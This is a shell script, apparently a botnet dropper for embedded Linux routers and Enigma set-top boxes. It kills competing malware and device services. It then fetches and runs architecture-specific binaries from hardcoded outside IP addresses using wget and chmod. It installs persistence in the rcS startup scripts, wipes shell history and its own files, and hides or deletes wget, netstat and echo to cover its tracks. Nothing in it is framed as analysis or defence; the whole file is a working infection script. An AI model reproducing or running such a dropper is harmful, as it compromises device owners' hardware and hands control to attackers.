#!/bin/sh
# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
# UPLOAD GETBINARIES.SH IN YOUR HTTPD.

# YOUR HTTPD SERVER:
REFERENCE_HTTP="http://178.79.183.247"
echo "nameserver 8.8.8.8" >/etc/resolv.conf
# NAME OF BINARIES:
REFERENCE_MIPSEL="m..ipsel"
REFERENCE_MIPS="m..ips"
REFERENCE_SUPERH="s..h"
REFERENCE_ARM="a..rm"
REFERENCE_PPC="pp..c"
IP="50.3.116.59"
killall /var/run/*
killall /var/run/.*/*
killall /var/run/.*
killall /var/run/.vsix/*
rm -rf /var/run/.vsix
rm -rf /var/etc/enigma.d
mv -f /usr/bin/-wget /usr/bin/wget
mv -f /bin/-wget /bin/wget
rm -rf /var/run/*ser*
rm -rf /var/run/.lightscan
rm -rf /var/run/emme
rm -rf /var/run/.lightpid
rm -rf /var/run/a
rm -rf /var/run/m
rm -rf /var/run/mi
rm -rf /var/run/s
rm -rf /var/run/*
rm -rf /var/run/*banner*
rm -rf /var/run/.z*
rm -rf /var/run/.lo*
killall ip5 
killall ipm
killall ips
killall ipa
killall ipp
rm -rf /var/run/.vsix
rm -fr /var/run/${REFERENCE_MIPSEL} \
        /var/run/${REFERENCE_MIPS} \
        /var/run/${REFERENCE_SUPERH} \
        /var/run/${REFERENCE_ARM} \
        /var/run/${REFERENCE_PPC}
killall ppc
killall servalms
killall serv2b
killall serv2s
killall b.mipsel
killall mipsel.b
ulimit -n 4096
killall -9 mmpl
killall .logd_ms
killall .logd_m
killall .logd_a
killall .logd_p
killall .logd_s
rm -rf /var/run/.output
rm -rf /var/run/.results
killall -9 mmps
killall -9 msph
killall -9 marm
killall -9 mppc
killall -9 enigma
killall -9 mm.exe
killall -9 zytr069main
killall -9 bullz_text
killall -9 gdaemon
killall -9 app
killall -9 boa
killall -9 agent
killall -9 httpp
killall -9 httpa
killall -9 https
killall -9 httpdm
killall -9 httpms
killall -9 tty_mi
killall -9 tty_ar
killall -9 tty_sh
killall -9 tty_pp
killall -9 a
killall -9 p
killall -9 ms
killall -9 s
killall -9 m
killall -9 b.mipsel
killall -9 mipsel.b
killall -9 enigma.d
killall -9 msx
killall -9 mx
killall -9 msx
killall -9 ax
killall -9 px
killall -9 32
killall -9 64
killall -9 m1
killall -9 m2
killall -9 m3
killall -9 m4
killall -9 m5
killall bash
killall [sh]
killall [arm]
killall [mps]
killall [ppc]
killall [mpl]
killall [sph]
killal -9 mipbox
killall -9 mpbox
killall -9 spbox
killall -9 apbox
killall -9 ipbox
killall -9 mipsel
killall mips
killall arm
killall enigma.d
killall bash
killall udhm
killall udhms
killall udhp
killall udhs
killall udha
killall httpa1
killall httpdm1
killall httpms1
killall httpp1
killall https1
killall a
killall mi
killall m
killall s
killall p
killall mipbox
wget -c http://178.79.183.247/emme -P /var/run && chmod +x /var/run/emme && /var/run/emme
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
wget -c http://$IP/cl -P /var/run && chmod +x /var/run/cl && /var/run/cl
sleep 3;
rm -fr /var/run/getbinaries.sh
rm -fr /var/etc/getbinaries.sh
rm -rf getbinaries.sh
rm -rf /var/run/*box*
rm -rf /home/root/.ash_history
rm -rf .ash_history
rm -rf emme
rm -rf cl
rm -rf /var/run/wget
rm -rf /var/run/cl
rm -rf /bin/.ash_history
rm -rf /home/root/*php*
mv /bin/wget /bin/-wget
mv /usr/sbin/wget /usr/sbin/-wget
mv /usr/bin/wget /usr/bin/-wget
mv /sbin/wget /bin/-wget
echo "/var/run/mipsl &" >> /etc/init.d/rcS
echo "/var/run/mipsl &" >> /etc/rcS
echo "/var/run/mipsell &" >> /etc/init.d/rcS
echo "/var/run/mipsell &" >> /etc/rcS
echo "/var/run/arml &" >> /etc/rcS
echo "/var/run/arml &" >> /etc/init.d/rcS
echo "/var/run/ppcl &" >> /etc/init.d/rcS
echo "/var/run/ppcl &" >> /etc/rcS
echo "/stm/disk/0/p1/shl &" >> /etc/init.d/S002.sh ; chmod 777 /etc/init.d/S002.sh
echo "/var/run/shl &" >> /etc/rcS
echo "/var/run/shl &" >> /etc/init.d/rcS
rm -rf /var/run/cl
rm -rf /var/run/a.sh
touch /etc/rcS.d/S97service
cp /var/run/m..ipsel /bin/mi
cp /var/run/pp..c /bin/pp
cp /var/run/m..ips /bin/mii
echo "/bin/pp" >> /etc/rcS.d/S97service
chmod +x /etc/rcS.d/S97service
echo "/bin/mi" >> /etc/rcS.d/S97service
echo "/bin/mii" >> /etc/rcS.d/S97service
rm -rf /var/run/*banner*
rm -rf /home/root/*banner*
rm -rf /home/root/*php*
mv /bin/echo /bin/eco
rm -rf /bin/netstat
rm -rf /bin/echo
